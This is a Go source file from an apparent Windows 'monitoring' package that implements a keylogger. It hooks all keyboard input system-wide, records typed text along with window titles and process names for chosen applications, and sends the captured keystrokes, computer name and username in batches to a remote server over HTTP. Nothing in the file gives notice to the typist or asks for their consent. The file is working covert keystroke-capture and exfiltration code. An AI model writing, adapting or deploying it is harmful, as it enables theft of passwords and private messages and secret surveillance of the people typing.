//go:build windows
// +build windows

package monitoring

import (
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	WH_KEYBOARD_LL = 13
	WM_KEYDOWN     = 0x0100
	WM_SYSKEYDOWN  = 0x0104
	WM_QUIT        = 0x0012
)

var (
	procSetWindowsHookEx    = modUser32.NewProc("SetWindowsHookExW")
	procCallNextHookEx      = modUser32.NewProc("CallNextHookEx")
	procUnhookWindowsHookEx = modUser32.NewProc("UnhookWindowsHookEx")
	procGetMessage          = modUser32.NewProc("GetMessageW")
	procTranslateMessage    = modUser32.NewProc("TranslateMessage")
	procDispatchMessage     = modUser32.NewProc("DispatchMessageW")
	procGetKeyState         = modUser32.NewProc("GetKeyState")
	procToUnicode           = modUser32.NewProc("ToUnicode")
	procGetKeyboardState    = modUser32.NewProc("GetKeyboardState")
)

type KBDLLHOOKSTRUCT struct {
	VkCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DwExtraInfo uintptr
}

type MSG struct {
	Hwnd    uintptr
	Message uint32
	WParam  uintptr
	LParam  uintptr
	Time    uint32
	Pt      struct{ X, Y int32 }
}

type Keylogger struct {
	serverURL          string
	computerName       string
	username           string
	enabled            bool
	monitoredProcesses map[string]bool
	bufferSizeChars    int
	sendIntervalMin    int
	hook               uintptr
	hookThreadID       uint32
	hookReady          chan error
	stopChan           chan struct{}
	wg                 sync.WaitGroup
	mu                 sync.RWMutex
	currentBuffer      *KeylogBuffer
	client             *http.Client
}

type KeylogBuffer struct {
	WindowTitle string
	ProcessName string
	StartTime   time.Time
	Content     strings.Builder
	KeyCount    int
}

type KeylogEvent struct {
	Timestamp    time.Time `json:"timestamp"`
	ComputerName string    `json:"computer_name"`
	Username     string    `json:"username"`
	WindowTitle  string    `json:"window_title"`
	ProcessName  string    `json:"process_name"`
	TextContent  string    `json:"text_content"`
	KeyCount     int       `json:"key_count"`
	Duration     int       `json:"duration_seconds"`
}

var globalKeylogger *Keylogger

func NewKeylogger(serverURL, computerName, username string, monitoredProcesses []string, bufferSizeChars, sendIntervalMin int) *Keylogger {
	procMap := make(map[string]bool)
	for _, proc := range monitoredProcesses {
		procMap[strings.ToLower(proc)] = true
	}

	k := &Keylogger{
		serverURL:          serverURL,
		computerName:       computerName,
		username:           username,
		enabled:            true,
		monitoredProcesses: procMap,
		bufferSizeChars:    bufferSizeChars,
		sendIntervalMin:    sendIntervalMin,
		hookReady:          make(chan error, 1),
		stopChan:           make(chan struct{}),
		client:             &http.Client{Timeout: 30 * time.Second},
		currentBuffer: &KeylogBuffer{
			StartTime: time.Now(),
		},
	}

	globalKeylogger = k
	return k
}

func (k *Keylogger) Start() error {
	log.Printf("Keylogger starting (monitoring: %v, buffer: %d chars, interval: %dm)",
		k.getMonitoredProcessNames(), k.bufferSizeChars, k.sendIntervalMin)

	k.wg.Add(2)
	go k.hookKeyboard()
	go k.sendWorker()

	if err := <-k.hookReady; err != nil {
		return fmt.Errorf("failed to start keylogger: %w", err)
	}

	log.Println("Keylogger started successfully")
	return nil
}

func (k *Keylogger) Stop() {
	log.Println("Stopping Keylogger...")
	close(k.stopChan)

	if k.hookThreadID != 0 {
		procPostThreadMessage.Call(
			uintptr(k.hookThreadID),
			WM_QUIT,
			0,
			0,
		)
	}

	if k.hook != 0 {
		procUnhookWindowsHookEx.Call(k.hook)
		k.hook = 0
	}

	k.wg.Wait()

	k.flushBuffer()
	log.Println("Keylogger stopped")
}

func (k *Keylogger) getMonitoredProcessNames() []string {
	names := make([]string, 0, len(k.monitoredProcesses))
	for name := range k.monitoredProcesses {
		names = append(names, name)
	}
	return names
}

func (k *Keylogger) hookKeyboard() {
	defer k.wg.Done()

	threadID, _, _ := procGetCurrentThreadId.Call()
	k.hookThreadID = uint32(threadID)

	hookProc := syscall.NewCallback(keyboardHookProc)

	hook, _, err := procSetWindowsHookEx.Call(
		WH_KEYBOARD_LL,
		hookProc,
		0,
		0,
	)

	if hook == 0 {
		k.hookReady <- fmt.Errorf("SetWindowsHookEx failed: %v", err)
		return
	}

	k.hook = hook

	var msg MSG
	procPeekMessage.Call(
		uintptr(unsafe.Pointer(&msg)),
		0,
		0,
		0,
		0,
	)

	k.hookReady <- nil
	log.Println("Keyboard hook installed successfully")

	for {
		ret, _, _ := procGetMessage.Call(
			uintptr(unsafe.Pointer(&msg)),
			0,
			0,
			0,
		)

		if ret == 0 || msg.Message == WM_QUIT {
			log.Println("Keyboard hook message loop exiting")
			return
		}

		procTranslateMessage.Call(uintptr(unsafe.Pointer(&msg)))
		procDispatchMessage.Call(uintptr(unsafe.Pointer(&msg)))
	}
}

func keyboardHookProc(nCode int, wParam uintptr, lParam uintptr) uintptr {
	if nCode >= 0 && globalKeylogger != nil {
		if wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN {
			kbdStruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
			globalKeylogger.handleKeyPress(kbdStruct.VkCode)
		}
	}

	ret, _, _ := procCallNextHookEx.Call(0, uintptr(nCode), wParam, lParam)
	return ret
}

func (k *Keylogger) handleKeyPress(vkCode uint32) {
	windowTitle := k.getForegroundWindowTitle()
	processName := k.getForegroundProcessName()

	if !k.shouldMonitorProcess(processName) {
		return
	}

	k.mu.Lock()
	defer k.mu.Unlock()

	if k.currentBuffer.ProcessName != processName || k.currentBuffer.WindowTitle != windowTitle {
		if k.currentBuffer.KeyCount > 0 {
			k.sendBuffer()
		}

		k.currentBuffer = &KeylogBuffer{
			WindowTitle: windowTitle,
			ProcessName: processName,
			StartTime:   time.Now(),
		}
	}

	char := k.vkCodeToChar(vkCode)
	if char != "" {
		k.currentBuffer.Content.WriteString(char)
		k.currentBuffer.KeyCount++

		if k.currentBuffer.Content.Len() >= k.bufferSizeChars {
			k.sendBuffer()
			k.currentBuffer = &KeylogBuffer{
				WindowTitle: windowTitle,
				ProcessName: processName,
				StartTime:   time.Now(),
			}
		}
	}
}

func (k *Keylogger) shouldMonitorProcess(processName string) bool {
	if len(k.monitoredProcesses) == 0 {
		return false
	}
	return k.monitoredProcesses[strings.ToLower(processName)]
}

func (k *Keylogger) vkCodeToChar(vkCode uint32) string {
	var keyState [256]byte
	procGetKeyboardState.Call(uintptr(unsafe.Pointer(&keyState[0])))

	var buffer [5]uint16
	ret, _, _ := procToUnicode.Call(
		uintptr(vkCode),
		0,
		uintptr(unsafe.Pointer(&keyState[0])),
		uintptr(unsafe.Pointer(&buffer[0])),
		5,
		0,
	)

	if ret > 0 {
		return syscall.UTF16ToString(buffer[:ret])
	}

	switch vkCode {
	case 0x08:
		return "[BACKSPACE]"
	case 0x09:
		return "[TAB]"
	case 0x0D:
		return "[ENTER]"
	case 0x1B:
		return "[ESC]"
	case 0x20:
		return " "
	case 0x2E:
		return "[DELETE]"
	default:
		return ""
	}
}

func (k *Keylogger) getForegroundWindowTitle() string {
	hwnd, _, _ := procGetForegroundWindow.Call()
	if hwnd == 0 {
		return ""
	}

	textLen := 256
	buf := make([]uint16, textLen)
	procGetWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), uintptr(textLen))

	return syscall.UTF16ToString(buf)
}

func (k *Keylogger) getForegroundProcessName() string {
	hwnd, _, _ := procGetForegroundWindow.Call()
	if hwnd == 0 {
		return ""
	}

	var processID uint32
	procGetWindowThreadProcessId.Call(hwnd, uintptr(unsafe.Pointer(&processID)))

	hProcess, _, _ := procOpenProcess.Call(
		windows.PROCESS_QUERY_LIMITED_INFORMATION,
		0,
		uintptr(processID),
	)
	if hProcess == 0 {
		return ""
	}
	defer procCloseHandle.Call(hProcess)

	var exePath [windows.MAX_PATH]uint16
	size := uint32(windows.MAX_PATH)
	procQueryFullProcessImageName.Call(
		hProcess,
		0,
		uintptr(unsafe.Pointer(&exePath[0])),
		uintptr(unsafe.Pointer(&size)),
	)

	fullPath := syscall.UTF16ToString(exePath[:])
	parts := strings.Split(fullPath, "\\")
	if len(parts) > 0 {
		return parts[len(parts)-1]
	}

	return ""
}

func (k *Keylogger) sendWorker() {
	defer k.wg.Done()

	ticker := time.NewTicker(time.Duration(k.sendIntervalMin) * time.Minute)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			k.mu.Lock()
			if k.currentBuffer.KeyCount > 0 {
				k.sendBuffer()
				k.currentBuffer = &KeylogBuffer{
					StartTime: time.Now(),
				}
			}
			k.mu.Unlock()

		case <-k.stopChan:
			return
		}
	}
}

func (k *Keylogger) sendBuffer() {
	if k.currentBuffer.KeyCount == 0 {
		return
	}

	duration := int(time.Since(k.currentBuffer.StartTime).Seconds())

	event := KeylogEvent{
		Timestamp:    time.Now(),
		ComputerName: k.computerName,
		Username:     k.username,
		WindowTitle:  k.currentBuffer.WindowTitle,
		ProcessName:  k.currentBuffer.ProcessName,
		TextContent:  k.currentBuffer.Content.String(),
		KeyCount:     k.currentBuffer.KeyCount,
		Duration:     duration,
	}

	if err := k.sendEvent(event); err != nil {
		log.Printf("Failed to send keylog event: %v", err)
	} else {
		log.Printf("Sent keylog: %s - %d keys in %ds", event.ProcessName, event.KeyCount, duration)
	}
}

func (k *Keylogger) flushBuffer() {
	k.mu.Lock()
	defer k.mu.Unlock()

	if k.currentBuffer.KeyCount > 0 {
		k.sendBuffer()
	}
}

func (k *Keylogger) sendEvent(event KeylogEvent) error {
	data, err := json.Marshal(event)
	if err != nil {
		return err
	}

	url := fmt.Sprintf("%s/api/keyboard/event", k.serverURL)
	resp, err := k.client.Post(url, "application/json", bytes.NewReader(data))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusCreated {
		return fmt.Errorf("server returned status %d", resp.StatusCode)
	}

	return nil
}
